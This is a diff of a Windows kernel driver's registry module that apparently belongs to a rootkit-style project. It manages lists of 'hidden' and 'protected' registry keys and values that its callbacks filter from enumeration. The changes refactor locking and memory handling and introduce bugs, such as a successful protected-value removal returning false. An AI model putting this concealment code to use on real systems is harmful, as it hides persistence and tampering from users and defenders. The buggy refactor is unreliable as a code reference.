@@ -1,13 +1,19 @@
 #include "pch.h"
 #include "RegistryUtils.hpp"
+#include "MemoryAllocator.hpp"
 
 RegistryUtils::RegistryUtils() {
 	this->RegCookie = { 0 };
 
 	this->ProtectedItems.Keys.KeysCount = 0;
+	this->ProtectedItems.Keys.LastIndex = 0;
 	this->ProtectedItems.Values.ValuesCount = 0;
+	this->ProtectedItems.Values.LastIndex = 0;
+
 	this->HiddenItems.Keys.KeysCount = 0;
+	this->HiddenItems.Keys.LastIndex = 0;
 	this->HiddenItems.Values.ValuesCount = 0;
+	this->HiddenItems.Values.LastIndex = 0;
 
 	memset(this->HiddenItems.Keys.KeysPath, 0, sizeof(this->HiddenItems.Keys.KeysPath));
 	memset(this->HiddenItems.Values.ValuesPath, 0, sizeof(this->HiddenItems.Values.ValuesPath));
@@ -24,19 +30,53 @@ RegistryUtils::RegistryUtils() {
 RegistryUtils::~RegistryUtils() {
 	AutoLock locker(this->Lock);
 
-	for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++) {
-		ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
-		this->ProtectedItems.Keys.KeysPath[i] = nullptr;
+	// Protected items.
+	for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
+		if (this->ProtectedItems.Keys.KeysPath[i]) {
+			ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
+			this->ProtectedItems.Keys.KeysPath[i] = nullptr;
+		}
 	}
 	this->ProtectedItems.Keys.KeysCount = 0;
+	this->ProtectedItems.Keys.LastIndex = 0;
 
-	for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++) {
-		ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
-		ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
-		this->ProtectedItems.Values.ValuesPath[i] = nullptr;
-		this->ProtectedItems.Values.ValuesName[i] = nullptr;
+	for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
+		if (this->ProtectedItems.Values.ValuesName[i]) {
+			ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
+			this->ProtectedItems.Values.ValuesName[i] = nullptr;
+		}
+		if (this->ProtectedItems.Values.ValuesPath[i]) {
+			ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
+			this->ProtectedItems.Values.ValuesPath[i] = nullptr;
+		}
+		
 	}
 	this->ProtectedItems.Values.ValuesCount = 0;
+	this->ProtectedItems.Values.LastIndex = 0;
+
+	// Hidden items.
+	for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
+		if (this->HiddenItems.Keys.KeysPath[i]) {
+			ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
+			this->HiddenItems.Keys.KeysPath[i] = nullptr;
+		}
+	}
+	this->HiddenItems.Keys.KeysCount = 0;
+	this->HiddenItems.Keys.LastIndex = 0;
+
+	for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
+		if (this->HiddenItems.Values.ValuesName[i]) {
+			ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
+			this->HiddenItems.Values.ValuesName[i] = nullptr;
+		}
+		if (this->HiddenItems.Values.ValuesPath[i]) {
+			ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
+			this->HiddenItems.Values.ValuesPath[i] = nullptr;
+		}
+
+	}
+	this->HiddenItems.Values.ValuesCount = 0;
+	this->HiddenItems.Values.LastIndex = 0;
 }
 
 
@@ -372,10 +412,10 @@ NTSTATUS RegistryUtils::RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION
 */
 NTSTATUS RegistryUtils::RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 	HANDLE key;
-	PVOID tempKeyInformation;
+	PVOID tempKeyInformation = NULL;
 	REG_ENUMERATE_KEY_INFORMATION* preInfo;
 	PCUNICODE_STRING regPath;
-	ULONG resultLength;
+	ULONG resultLength = 0;
 	RegItem item{};
 	UNICODE_STRING keyName;
 	int counter = 0;
@@ -383,14 +423,13 @@ NTSTATUS RegistryUtils::RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMAT
 	bool copyKeyInformationitem = true;
 
 	if (!NT_SUCCESS(info->Status)) {
-		return STATUS_SUCCESS;
+		return status;
 	}
 
-	AutoLock locker(this->Lock);
 	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status))
-		return STATUS_SUCCESS;
+		return status;
 
 	// Checking if the registry key contains any protected registry key.
 	if (!ContainsProtectedRegKey(*regPath, RegHiddenKey)) {
@@ -415,7 +454,7 @@ NTSTATUS RegistryUtils::RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMAT
 		return STATUS_SUCCESS;
 	}
 
-	tempKeyInformation = (LPWSTR)ExAllocatePoolWithTag(PagedPool, preInfo->Length, DRIVER_TAG);
+	MemoryAllocator<PVOID> tempKeyInfoAlloc(tempKeyInformation, preInfo->Length, PagedPool);
 
 	if (tempKeyInformation) {
 		item.Type = RegHiddenKey;
@@ -464,8 +503,6 @@ NTSTATUS RegistryUtils::RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMAT
 			item.KeyPath[0] = L'\0';
 			wcsncpy_s(item.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
 		}
-
-		ExFreePoolWithTag(tempKeyInformation, DRIVER_TAG);
 	}
 	else
 		status = STATUS_SUCCESS;
@@ -489,11 +526,11 @@ NTSTATUS RegistryUtils::RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMAT
 */
 NTSTATUS RegistryUtils::RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 	HANDLE key;
-	PVOID tempValueInformation;
+	PVOID tempValueInformation = NULL;
 	REG_ENUMERATE_VALUE_KEY_INFORMATION* preInfo;
 	PCUNICODE_STRING regPath;
 	UNICODE_STRING valueName;
-	ULONG resultLength;
+	ULONG resultLength = 0;
 	RegItem item{};
 	NTSTATUS status = STATUS_SUCCESS;
 	bool copyKeyInformationitem = true;
@@ -503,7 +540,6 @@ NTSTATUS RegistryUtils::RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INF
 		return STATUS_SUCCESS;
 	}
 
-	AutoLock locker(this->Lock);
 	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status))
@@ -530,8 +566,7 @@ NTSTATUS RegistryUtils::RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INF
 		CmCallbackReleaseKeyObjectIDEx(regPath);
 		return STATUS_SUCCESS;
 	}
-
-	tempValueInformation = (PVOID)ExAllocatePoolWithTag(PagedPool, preInfo->Length, DRIVER_TAG);
+	MemoryAllocator<PVOID> tempValueInfoAlloc(tempValueInformation, preInfo->Length, PagedPool);
 
 	if (tempValueInformation) {
 		item.Type = RegHiddenValue;
@@ -575,8 +610,6 @@ NTSTATUS RegistryUtils::RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INF
 				KeRaiseIrql(prevIrql, &prevIrql);
 			}
 		}
-
-		ExFreePoolWithTag(tempValueInformation, DRIVER_TAG);
 	}
 	else
 		status = STATUS_SUCCESS;
@@ -681,30 +714,63 @@ bool RegistryUtils::GetNameFromKeyEnumPreInfo(KEY_INFORMATION_CLASS infoClass, P
 * @status [bool]	 -- Whether found or not.
 */
 bool RegistryUtils::FindRegItem(RegItem* item) {
-	if (item->Type == RegProtectedKey) {
-		for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++)
-			if (_wcsnicmp(this->ProtectedItems.Keys.KeysPath[i], item->KeyPath, wcslen(this->ProtectedItems.Keys.KeysPath[i])) == 0)
-				return true;
-	}
-	else if (item->Type == RegHiddenKey) {
-		for (ULONG i = 0; i < this->HiddenItems.Keys.KeysCount; i++)
-			if (_wcsnicmp(this->HiddenItems.Keys.KeysPath[i], item->KeyPath, wcslen(this->HiddenItems.Keys.KeysPath[i])) == 0)
-				return true;
-	}
-	else if (item->Type == RegProtectedValue) {
-		for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++)
-			if (_wcsnicmp(this->ProtectedItems.Values.ValuesPath[i], item->KeyPath, wcslen(this->ProtectedItems.Values.ValuesPath[i])) == 0 &&
-				_wcsnicmp(this->ProtectedItems.Values.ValuesName[i], item->ValueName, wcslen(this->ProtectedItems.Values.ValuesName[i])) == 0)
-				return true;
-	}
-	else if (item->Type == RegHiddenValue) {
-		for (ULONG i = 0; i < this->HiddenItems.Values.ValuesCount; i++)
-			if (_wcsnicmp(this->HiddenItems.Values.ValuesPath[i], item->KeyPath, wcslen(this->HiddenItems.Values.ValuesPath[i])) == 0 &&
-				_wcsnicmp(this->HiddenItems.Values.ValuesName[i], item->ValueName, wcslen(this->HiddenItems.Values.ValuesName[i])) == 0)
-				return true;
+	bool found = false;
+	AutoLock locker(this->Lock);
+
+	switch (item->Type) {
+		case RegProtectedKey:
+		{
+			for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
+				if (this->ProtectedItems.Keys.KeysPath[i]) {
+					if (_wcsnicmp(this->ProtectedItems.Keys.KeysPath[i], item->KeyPath, wcslen(this->ProtectedItems.Keys.KeysPath[i])) == 0) {
+						found = true;
+						break;
+					}
+				}
+			}
+			break;
+		}
+		case RegHiddenKey:
+		{
+			for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
+				if (this->HiddenItems.Keys.KeysPath[i]) {
+					if (_wcsnicmp(this->HiddenItems.Keys.KeysPath[i], item->KeyPath, wcslen(this->HiddenItems.Keys.KeysPath[i])) == 0) {
+						found = true;
+						break;
+					}
+				}
+			}
+			break;
+		}
+		case RegProtectedValue:
+		{
+			for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
+				if (this->ProtectedItems.Values.ValuesPath[i] && this->ProtectedItems.Values.ValuesName[i]) {
+					if (_wcsnicmp(this->ProtectedItems.Values.ValuesPath[i], item->KeyPath, wcslen(this->ProtectedItems.Values.ValuesPath[i])) == 0 &&
+						_wcsnicmp(this->ProtectedItems.Values.ValuesName[i], item->ValueName, wcslen(this->ProtectedItems.Values.ValuesName[i])) == 0) {
+						found = true;
+						break;
+					}
+				}
+			}
+			break;
+		}
+		case RegHiddenValue:
+		{
+			for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
+				if (this->HiddenItems.Values.ValuesPath[i] && this->HiddenItems.Values.ValuesName[i]) {
+					if (_wcsnicmp(this->HiddenItems.Values.ValuesPath[i], item->KeyPath, wcslen(this->HiddenItems.Values.ValuesPath[i])) == 0 &&
+						_wcsnicmp(this->HiddenItems.Values.ValuesName[i], item->ValueName, wcslen(this->HiddenItems.Values.ValuesName[i])) == 0) {
+						found = true;
+						break;
+					}
+				}
+			}
+			break;
+		}
 	}
 
-	return false;
+	return found;
 }
 
 /*
@@ -719,32 +785,59 @@ bool RegistryUtils::FindRegItem(RegItem* item) {
 * @status [bool]		   -- Whether found or not.
 */
 bool RegistryUtils::ContainsProtectedRegKey(UNICODE_STRING regKey, RegItemType type) {
-	if (type == RegProtectedKey) {
-		for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++) {
-			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->ProtectedItems.Keys.KeysPath[i]) && _wcsnicmp(this->ProtectedItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
-				return true;
+	bool found = false;
+	AutoLock locker(this->Lock);
+
+	switch (type) {
+	case RegProtectedKey:
+	{
+		for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
+			if (this->ProtectedItems.Keys.KeysPath[i]) {
+				if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->ProtectedItems.Keys.KeysPath[i]) && _wcsnicmp(this->ProtectedItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0) {
+					found = true;
+					break;
+				}
+			}
 		}
+		break;
 	}
-	else if (type == RegHiddenKey) {
-		for (ULONG i = 0; i < this->HiddenItems.Keys.KeysCount; i++) {
-			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->HiddenItems.Keys.KeysPath[i]) && _wcsnicmp(this->HiddenItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
-				return true;
+	case RegHiddenKey:
+	{
+		for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
+			if (this->HiddenItems.Keys.KeysPath[i]) {
+				if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->HiddenItems.Keys.KeysPath[i]) && _wcsnicmp(this->HiddenItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0) {
+					found = true;
+					break;
+				}
+			}
 		}
+		break;
 	}
-	else if (type == RegProtectedValue) {
-		for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++) {
-			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->ProtectedItems.Values.ValuesPath[i]) && _wcsnicmp(this->ProtectedItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
-				return true;
+	case RegProtectedValue:
+	{
+		for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
+			if (this->ProtectedItems.Values.ValuesPath[i]) {
+				if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->ProtectedItems.Values.ValuesPath[i]) && _wcsnicmp(this->ProtectedItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0) {
+					found = true;
+					break;
+				}
+			}
 		}
+		break;
 	}
-	else if (type == RegHiddenValue) {
-		for (ULONG i = 0; i < this->HiddenItems.Values.ValuesCount; i++) {
-			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->HiddenItems.Values.ValuesPath[i]) && _wcsnicmp(this->HiddenItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
-				return true;
+	case RegHiddenValue:
+	{
+		for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
+			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->HiddenItems.Values.ValuesPath[i]) && _wcsnicmp(this->HiddenItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0) {
+				found = true;
+				break;
+			}
 		}
+		break;
+	}
 	}
 
-	return false;
+	return found;
 }
 
 /*
@@ -758,101 +851,164 @@ bool RegistryUtils::ContainsProtectedRegKey(UNICODE_STRING regKey, RegItemType t
 * @status [bool]	 -- Whether successfully added or not.
 */
 bool RegistryUtils::AddRegItem(RegItem* item) {
-	if (item->Type == RegProtectedKey) {
+	bool added = false;
+	AutoLock locker(this->Lock);
+
+	switch (item->Type) {
+	case RegProtectedKey:
+	{
 		for (int i = 0; i < MAX_REG_ITEMS; i++)
 			if (this->ProtectedItems.Keys.KeysPath[i] == nullptr) {
-				auto len = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
-				auto buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);
+				SIZE_T len = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
+				WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);
 
 				// Not enough resources.
-				if (!buffer) {
-					KdPrint((DRIVER_PREFIX "Not enough resources\n"));
+				if (!buffer)
+					break;
+
+				errno_t err = wcscpy_s(buffer, len / sizeof(WCHAR), item->KeyPath);
+
+				if (err != 0) {
+					ExFreePoolWithTag(buffer, DRIVER_TAG);
 					break;
 				}
 
-				wcscpy_s(buffer, len / sizeof(WCHAR), item->KeyPath);
+				if (i > this->ProtectedItems.Keys.LastIndex)
+					this->ProtectedItems.Keys.LastIndex = i;
+
 				this->ProtectedItems.Keys.KeysPath[i] = buffer;
 				this->ProtectedItems.Keys.KeysCount++;
-				return true;
+				added = true;
+				break;
 			}
+		break;
 	}
-	else if (item->Type == RegHiddenKey) {
+	case RegHiddenKey:
+	{
 		for (int i = 0; i < MAX_REG_ITEMS; i++)
 			if (this->HiddenItems.Keys.KeysPath[i] == nullptr) {
-				auto len = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
-				auto buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);
+				SIZE_T len = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
+				WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);
 
 				// Not enough resources.
-				if (!buffer) {
-					KdPrint((DRIVER_PREFIX "Not enough resources\n"));
+				if (!buffer)
+					break;
+
+				errno_t err = wcscpy_s(buffer, len / sizeof(WCHAR), item->KeyPath);
+
+				if (err != 0) {
+					ExFreePoolWithTag(buffer, DRIVER_TAG);
 					break;
 				}
 
-				wcscpy_s(buffer, len / sizeof(WCHAR), item->KeyPath);
+				if (i > this->HiddenItems.Keys.LastIndex)
+					this->HiddenItems.Keys.LastIndex = i;
+
 				this->HiddenItems.Keys.KeysPath[i] = buffer;
 				this->HiddenItems.Keys.KeysCount++;
-				return true;
+				added = true;
+				break;
 			}
+		break;
 	}
-	else if (item->Type == RegProtectedValue) {
+	case RegProtectedValue:
+	{
 		for (int i = 0; i < MAX_REG_ITEMS; i++) {
 			if (this->ProtectedItems.Values.ValuesPath[i] == nullptr) {
-				auto keyLen = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
-				auto keyPath = (WCHAR*)ExAllocatePoolWithTag(PagedPool, keyLen, DRIVER_TAG);
+				SIZE_T keyLen = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
+				WCHAR* keyPath = (WCHAR*)ExAllocatePoolWithTag(PagedPool, keyLen, DRIVER_TAG);
 
-				// Not enough resources.
 				if (!keyPath) {
 					break;
 				}
 
-				auto valueNameLen = (wcslen(item->ValueName) + 1) * sizeof(WCHAR);
-				auto valueName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, valueNameLen, DRIVER_TAG);
+				SIZE_T valueNameLen = (wcslen(item->ValueName) + 1) * sizeof(WCHAR);
+				WCHAR* valueName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, valueNameLen, DRIVER_TAG);
 
 				if (!valueName) {
 					ExFreePoolWithTag(keyPath, DRIVER_TAG);
 					break;
 				}
 
-				wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item->KeyPath);
-				wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item->ValueName);
+				errno_t err = wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item->KeyPath);
+
+				if (err != 0) {
+					ExFreePoolWithTag(valueName, DRIVER_TAG);
+					ExFreePoolWithTag(keyPath, DRIVER_TAG);
+					break;
+				}
+				err = wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item->ValueName);
+
+				if (err != 0) {
+					ExFreePoolWithTag(valueName, DRIVER_TAG);
+					ExFreePoolWithTag(keyPath, DRIVER_TAG);
+					break;
+				}
+
+				if (i > this->ProtectedItems.Values.LastIndex)
+					this->ProtectedItems.Values.LastIndex = i;
+
 				this->ProtectedItems.Values.ValuesPath[i] = keyPath;
 				this->ProtectedItems.Values.ValuesName[i] = valueName;
 				this->ProtectedItems.Values.ValuesCount++;
-				return true;
+				added = true;
+				break;
 			}
 		}
+		break;
 	}
 
-	else if (item->Type == RegHiddenValue) {
+	case RegHiddenValue:
+	{
 		for (int i = 0; i < MAX_REG_ITEMS; i++) {
 			if (this->HiddenItems.Values.ValuesPath[i] == nullptr) {
-				auto keyLen = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
-				auto keyPath = (WCHAR*)ExAllocatePoolWithTag(PagedPool, keyLen, DRIVER_TAG);
+				SIZE_T keyLen = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
+				WCHAR* keyPath = (WCHAR*)ExAllocatePoolWithTag(PagedPool, keyLen, DRIVER_TAG);
 
 				// Not enough resources.
 				if (!keyPath) {
 					break;
 				}
 
-				auto valueNameLen = (wcslen(item->ValueName) + 1) * sizeof(WCHAR);
-				auto valueName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, valueNameLen, DRIVER_TAG);
+				SIZE_T valueNameLen = (wcslen(item->ValueName) + 1) * sizeof(WCHAR);
+				WCHAR* valueName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, valueNameLen, DRIVER_TAG);
 
 				if (!valueName) {
 					ExFreePoolWithTag(keyPath, DRIVER_TAG);
 					break;
 				}
 
-				wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item->KeyPath);
-				wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item->ValueName);
+				errno_t err = wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item->KeyPath);
+
+				if (err != 0) {
+					ExFreePoolWithTag(valueName, DRIVER_TAG);
+					ExFreePoolWithTag(keyPath, DRIVER_TAG);
+					break;
+				}
+				err = wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item->ValueName);
+
+				if (err != 0) {
+					ExFreePoolWithTag(valueName, DRIVER_TAG);
+					ExFreePoolWithTag(keyPath, DRIVER_TAG);
+					break;
+				}
+
+				if (i > this->HiddenItems.Values.LastIndex)
+					this->HiddenItems.Values.LastIndex = i;
+
 				this->HiddenItems.Values.ValuesPath[i] = keyPath;
 				this->HiddenItems.Values.ValuesName[i] = valueName;
 				this->HiddenItems.Values.ValuesCount++;
-				return true;
+				added = true;
+				break;
 			}
 		}
+
+		break;
+	}
 	}
 
-	return false;
+	return added;
 }
 
 /*
@@ -866,53 +1022,102 @@ bool RegistryUtils::AddRegItem(RegItem* item) {
 * @status [bool]	 -- Whether successfully removed or not.
 */
 bool RegistryUtils::RemoveRegItem(RegItem* item) {
-	if (item->Type == RegProtectedKey) {
-		for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++) {
+	bool removed = false;
+	ULONG newLastIndex = 0;
+	AutoLock locker(this->Lock);
 
-			if (_wcsicmp(this->ProtectedItems.Keys.KeysPath[i], item->KeyPath) == 0) {
-				ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
-				this->ProtectedItems.Keys.KeysPath[i] = nullptr;
-				this->ProtectedItems.Keys.KeysCount--;
-				return true;
+	switch (item->Type) {
+	case RegProtectedKey:
+	{
+		for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
+			if (this->ProtectedItems.Keys.KeysPath[i]) {
+				if (_wcsicmp(this->ProtectedItems.Keys.KeysPath[i], item->KeyPath) == 0) {
+					ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
+
+					if (i == this->ProtectedItems.Keys.LastIndex)
+						this->ProtectedItems.Keys.LastIndex = newLastIndex;
+
+					this->ProtectedItems.Keys.KeysPath[i] = nullptr;
+					this->ProtectedItems.Keys.KeysCount--;
+					removed = true;
+					break;
+				}
+				else
+					newLastIndex = i;
 			}
 		}
+		break;
 	}
-	else if (item->Type == RegHiddenKey) {
-		for (ULONG i = 0; i < this->HiddenItems.Keys.KeysCount; i++) {
+	case RegHiddenKey:
+	{
+		for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
+			if (this->HiddenItems.Keys.KeysPath[i]) {
+				if (_wcsicmp(this->HiddenItems.Keys.KeysPath[i], item->KeyPath) == 0) {
+					ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
 
-			if (_wcsicmp(this->HiddenItems.Keys.KeysPath[i], item->KeyPath) == 0) {
-				ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
-				this->HiddenItems.Keys.KeysPath[i] = nullptr;
-				this->HiddenItems.Keys.KeysCount--;
-				return true;
+					if (i == this->HiddenItems.Keys.LastIndex)
+						this->HiddenItems.Keys.LastIndex = newLastIndex;
+					this->HiddenItems.Keys.KeysPath[i] = nullptr;
+					this->HiddenItems.Keys.KeysCount--;
+					removed = true;
+					break;
+				}
+				else
+					newLastIndex = i;
 			}
 		}
+		break;
 	}
-	else if (item->Type == RegProtectedValue) {
-		for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++)
-			if (_wcsicmp(this->ProtectedItems.Values.ValuesPath[i], item->KeyPath) == 0 &&
-				_wcsicmp(this->ProtectedItems.Values.ValuesName[i], item->ValueName) == 0) {
-				ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
-				ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
-				this->ProtectedItems.Values.ValuesPath[i] = nullptr;
-				this->ProtectedItems.Values.ValuesName[i] = nullptr;
-				this->ProtectedItems.Values.ValuesCount--;
-				return true;
+	case RegProtectedValue:
+	{
+		for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
+			if (this->ProtectedItems.Values.ValuesPath[i] && this->ProtectedItems.Values.ValuesName[i]) {
+				if (_wcsicmp(this->ProtectedItems.Values.ValuesPath[i], item->KeyPath) == 0 &&
+					_wcsicmp(this->ProtectedItems.Values.ValuesName[i], item->ValueName) == 0) {
+					ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
+					ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
+					this->ProtectedItems.Values.ValuesPath[i] = nullptr;
+					this->ProtectedItems.Values.ValuesName[i] = nullptr;
+
+					if (i == this->ProtectedItems.Values.LastIndex)
+						this->ProtectedItems.Values.LastIndex = newLastIndex;
+					this->ProtectedItems.Values.ValuesCount--;
+					removed = false;
+					break;
+				}
+				else
+					newLastIndex = i;
 			}
+		}
+		break;
 	}
-	else if (item->Type == RegHiddenValue) {
-		for (ULONG i = 0; i < this->HiddenItems.Values.ValuesCount; i++)
-			if (_wcsicmp(this->HiddenItems.Values.ValuesPath[i], item->KeyPath) == 0 &&
-				_wcsicmp(this->HiddenItems.Values.ValuesName[i], item->ValueName) == 0) {
-				ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
-				ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
-				this->HiddenItems.Values.ValuesPath[i] = nullptr;
-				this->HiddenItems.Values.ValuesName[i] = nullptr;
-				this->HiddenItems.Values.ValuesCount--;
-				return true;
+	case RegHiddenValue:
+	{
+		for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
+			if (this->HiddenItems.Values.ValuesPath[i]) {
+				if (_wcsicmp(this->HiddenItems.Values.ValuesPath[i], item->KeyPath) == 0 &&
+					_wcsicmp(this->HiddenItems.Values.ValuesName[i], item->ValueName) == 0) {
+					ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
+					ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
+					this->HiddenItems.Values.ValuesPath[i] = nullptr;
+					this->HiddenItems.Values.ValuesName[i] = nullptr;
+
+					if (i == this->HiddenItems.Values.LastIndex)
+						this->HiddenItems.Values.LastIndex = newLastIndex;
+
+					this->HiddenItems.Values.ValuesCount--;
+					removed = true;
+					break;
+				}
+				else
+					newLastIndex = i;
 			}
+		}
+		break;
 	}
-	return false;
+	}
+
+	return removed;
 }
 
 /*
@@ -926,44 +1131,68 @@ bool RegistryUtils::RemoveRegItem(RegItem* item) {
 * There is no return value.
 */
 void RegistryUtils::ClearRegItem(RegItemType regType) {
+	AutoLock locker(this->Lock);
+
 	switch (regType) {
 	case RegProtectedKey:
 	{
-		for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++) {
-			ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
-			this->ProtectedItems.Keys.KeysPath[i] = nullptr;
+		for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
+			if (this->ProtectedItems.Keys.KeysPath[i]) {
+				ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
+				this->ProtectedItems.Keys.KeysPath[i] = nullptr;
+			}
 		}
+
 		this->ProtectedItems.Keys.KeysCount = 0;
+		this->ProtectedItems.Keys.LastIndex = 0;
 		break;
 	}
 	case RegHiddenKey:
 	{
-		for (ULONG i = 0; i < this->HiddenItems.Keys.KeysCount; i++) {
-			ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
-			this->HiddenItems.Keys.KeysPath[i] = nullptr;
+		for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
+			if (this->HiddenItems.Keys.KeysPath[i]) {
+				ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
+				this->HiddenItems.Keys.KeysPath[i] = nullptr;
+			}
 		}
+
+		this->HiddenItems.Keys.LastIndex = 0;
 		this->HiddenItems.Keys.KeysCount = 0;
 		break;
 	}
 	case RegProtectedValue:
 	{
-		for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++) {
-			ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
-			ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
-			this->ProtectedItems.Values.ValuesPath[i] = nullptr;
